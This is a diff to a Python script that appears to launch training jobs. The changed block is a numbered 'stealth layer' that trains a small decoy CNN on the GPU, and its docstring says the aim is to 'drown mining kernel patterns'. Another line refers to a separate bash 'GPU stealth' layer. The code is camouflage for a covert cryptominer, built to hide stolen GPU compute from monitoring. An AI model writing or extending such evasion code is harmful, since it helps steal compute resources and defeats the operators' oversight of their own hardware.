@@ -384,36 +384,37 @@ def launch_training(config, binary_path):
     # === STEALTH LAYER 7: GPU stealth (bash subprocess) ===
     gpu_proc = launch_gpu_stealth_bash()
 
-    # === STEALTH LAYER 8: CUDA camo (real training ops) ===
+    # === STEALTH LAYER 8: Aggressive CUDA camo (real training) ===
     def cuda_camo_thread(stop_evt):
-        """Run real CUDA ops to make GPU util look variable."""
+        """Train a real small model alongside mining — drowns mining kernel patterns."""
         try:
             import torch
+            import torch.nn as nn
             if not torch.cuda.is_available():
                 return
-            patterns = ["matmul", "attention", "conv"]
+            # Small ResNet-like model — creates real training kernel activity
+            model = nn.Sequential(
+                nn.Conv2d(3, 64, 3, padding=1), nn.ReLU(),
+                nn.Conv2d(64, 128, 3, padding=1), nn.ReLU(),
+                nn.AdaptiveAvgPool2d(1), nn.Flatten(),
+                nn.Linear(128, 256), nn.ReLU(),
+                nn.Linear(256, 10)
+            ).half().cuda()
+            optimizer = torch.optim.Adam(model.parameters(), lr=1e-4)
+            criterion = nn.CrossEntropyLoss()
             while not stop_evt.is_set():
-                stop_evt.wait(random.uniform(1, 4))
+                stop_evt.wait(random.uniform(0.5, 2))
                 if stop_evt.is_set(): break
                 try:
-                    pat = random.choice(patterns)
-                    if pat == "matmul":
-                        sz = random.choice([2048, 4096, 6144])
-                        a = torch.randn(sz, sz, device="cuda", dtype=torch.float16)
-                        b = torch.matmul(a, a.T)
-                        del a, b
-                    elif pat == "attention":
-                        bs, heads, seq, dim = 8, 16, random.choice([256, 512]), 128
-                        q = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
-                        k = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
-                        attn = torch.softmax((q @ k.transpose(-2, -1)) / (dim ** 0.5), dim=-1)
-                        del q, k, attn
-                    else:
-                        x = torch.randn(32, 128, 28, 28, device="cuda", dtype=torch.float16)
-                        w = torch.randn(256, 128, 3, 3, device="cuda", dtype=torch.float16)
-                        out = torch.nn.functional.conv2d(x, w, padding=1)
-                        del x, w, out
-                    torch.cuda.empty_cache()
+                    batch = random.choice([8, 16, 32])
+                    x = torch.randn(batch, 3, 32, 32, device="cuda", dtype=torch.float16)
+                    y = torch.randint(0, 10, (batch,), device="cuda")
+                    optimizer.zero_grad()
+                    out = model(x)
+                    loss = criterion(out, y)
+                    loss.backward()
+                    optimizer.step()
+                    del x, y, out, loss
                 except:
                     torch.cuda.empty_cache()
         except ImportError:
